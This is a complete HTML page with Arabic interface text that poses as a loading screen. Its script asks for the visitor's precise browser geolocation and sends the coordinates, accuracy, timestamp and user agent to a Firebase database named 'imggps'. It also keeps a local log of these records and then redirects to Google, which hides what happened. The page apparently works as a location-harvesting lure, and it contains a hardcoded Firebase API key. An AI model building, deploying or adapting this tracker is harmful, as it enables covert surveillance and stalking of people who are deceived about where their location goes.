<!DOCTYPE html>
<html lang="ar" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body {
            background: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: white;
            flex-direction: column;
        }
        .loader { text-align: center; }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #8ab4f8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .message {
            font-size: 16px;
            color: #ccc;
            margin: 8px 0;
        }
        .error { color: #f28b82; }
        .sub { font-size: 13px; color: #888; }
        #retryBtn {
            margin-top: 20px;
            background: #8ab4f8;
            color: #202124;
            border: none;
            padding: 8px 24px;
            border-radius: 20px;
            font-weight: bold;
            cursor: pointer;
            display: none;
        }
        #retryBtn:hover { background: #a8c8fa; }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner" id="spinner"></div>
        <div class="message" id="status">⏳ جاري تحديد الموقع...</div>
        <div class="sub" id="subStatus">يرجى السماح للمتصفح بالوصول إلى الموقع</div>
        <button id="retryBtn" onclick="retryGeolocation()">🔄 إعادة المحاولة</button>
    </div>

    <script>
        // ===== الإعدادات =====
        const firebaseConfig = {
            apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
            databaseURL: "https://imggps-default-rtdb.firebaseio.com",
            projectId: "imggps"
        };
        const DB_PATH = "visitors";
        // الرابط الذي ستوجه إليه بعد الحفظ (عدّله حسب رغبتك)
        const TARGET_URL = "https://www.google.com";

        // ===== عناصر الواجهة =====
        const statusEl = document.getElementById('status');
        const subEl = document.getElementById('subStatus');
        const retryBtn = document.getElementById('retryBtn');
        const spinner = document.getElementById('spinner');

        let redirectTimer = null;
        let isRedirecting = false;

        // ===== دوال مساعدة =====
        function setStatus(text, isError = false) {
            statusEl.textContent = text;
            statusEl.className = `message${isError ? ' error' : ''}`;
        }

        function setSub(text) {
            subEl.textContent = text;
        }

        function showRetryBtn(show = true) {
            retryBtn.style.display = show ? 'inline-block' : 'none';
        }

        function redirect() {
            if (isRedirecting) return;
            isRedirecting = true;
            setStatus('⏳ جاري التوجيه...');
            setTimeout(() => {
                window.location.href = TARGET_URL;
            }, 800);
        }

        // ===== حفظ البيانات =====
        function saveData(lat, lng, accuracy) {
            const record = {
                lat: parseFloat(lat),
                lng: parseFloat(lng),
                accuracy: accuracy || null,
                timestamp: Date.now(),
                userAgent: navigator.userAgent.substring(0, 100)
            };

            // حفظ محلي (آخر 100)
            try {
                let localData = JSON.parse(localStorage.getItem('geo_log') || '[]');
                if (!Array.isArray(localData)) localData = [];
                localData.push(record);
                if (localData.length > 100) localData = localData.slice(-100);
                localStorage.setItem('geo_log', JSON.stringify(localData));
            } catch (e) { /* تجاهل */ }

            // إرسال إلى Firebase
            setStatus('📤 جاري حفظ الموقع...');
            setSub('جاري المزامنة مع السحابة');

            return fetch(`${firebaseConfig.databaseURL}/${DB_PATH}.json`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(record)
            })
            .then(response => {
                if (!response.ok) throw new Error(`HTTP ${response.status}`);
                return response.json();
            })
            .then(() => {
                setStatus('✅ تم الحفظ بنجاح');
                setSub('سيتم التوجيه خلال لحظات...');
            })
            .catch(err => {
                console.warn('فشل الحفظ السحابي:', err);
                setStatus('⚠️ تم الحفظ محلياً فقط', true);
                setSub('لم نتمكن من الاتصال بالسحابة، سيتم التوجيه مع ذلك');
            });
        }

        // ===== معالجة الموقع =====
        function handlePosition(pos) {
            // إلغاء أي مؤقت توجيه سابق
            if (redirectTimer) clearTimeout(redirectTimer);

            const lat = pos.coords.latitude.toFixed(7);
            const lng = pos.coords.longitude.toFixed(7);
            const acc = pos.coords.accuracy ? pos.coords.accuracy.toFixed(1) : null;

            setStatus(`📍 تم التحديد (${lat}, ${lng})`);
            setSub('الدقة: ' + (acc ? acc + ' متر' : 'غير معروفة'));

            // حفظ ثم توجيه
            saveData(lat, lng, acc)
                .finally(() => {
                    // توجيه بعد 1.5 ثانية لرؤية رسالة النجاح
                    redirectTimer = setTimeout(redirect, 1500);
                });
        }

        function handleError(err) {
            // إلغاء أي توجيه سابق
            if (redirectTimer) clearTimeout(redirectTimer);

            console.warn('خطأ في تحديد الموقع:', err.message);
            let msg = 'لم نتمكن من تحديد موقعك.';
            let subMsg = '';

            switch (err.code) {
                case 1: // PERMISSION_DENIED
                    msg = '🚫 تم رفض مشاركة الموقع';
                    subMsg = 'يرجى السماح بالموقع في إعدادات المتصفح';
                    break;
                case 2: // POSITION_UNAVAILABLE
                    msg = '📡 الموقع غير متوفر حالياً';
                    subMsg = 'تأكد من تفعيل GPS أو الواي فاي';
                    break;
                case 3: // TIMEOUT
                    msg = '⏱️ انتهت مهلة التحديد';
                    subMsg = 'حاول مجدداً أو تأكد من الإشارة';
                    break;
                default:
                    subMsg = 'حدث خطأ غير متوقع';
            }

            setStatus(msg, true);
            setSub(subMsg);
            showRetryBtn(true); // نعرض زر إعادة المحاولة

            // توجيه تلقائي بعد 5 ثوانٍ إذا لم يضغط المستخدم
            redirectTimer = setTimeout(() => {
                setStatus('⏳ سيتم التوجيه تلقائياً...');
                redirect();
            }, 5000);
        }

        // ===== إعادة المحاولة =====
        function retryGeolocation() {
            if (redirectTimer) clearTimeout(redirectTimer);
            showRetryBtn(false);
            setStatus('⏳ جاري تحديد الموقع...');
            setSub('يرجى السماح للمتصفح بالوصول إلى الموقع');
            navigator.geolocation.getCurrentPosition(
                handlePosition,
                handleError,
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        }

        // ===== البدء =====
        if (navigator.geolocation) {
            setStatus('📍 جاري فتح الموقع...');
            setSub('سيُطلب منك السماح بالوصول إلى الموقع');
            navigator.geolocation.getCurrentPosition(
                handlePosition,
                handleError,
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
        } else {
            setStatus('⚠️ المتصفح لا يدعم تحديد الموقع', true);
            setSub('سيتم التوجيه تلقائياً...');
            showRetryBtn(false);
            setTimeout(redirect, 3000);
        }

        // مهلة عامة احتياطية (20 ثانية) في حال علق كل شيء
        setTimeout(() => {
            if (!isRedirecting && !window.location.href.includes(TARGET_URL)) {
                setStatus('⏳ مهلة عامة، جاري التوجيه...', true);
                setSub('تم تجاوز الوقت المسموح');
                redirect();
            }
        }, 20000);
    </script>
</body>
</html>
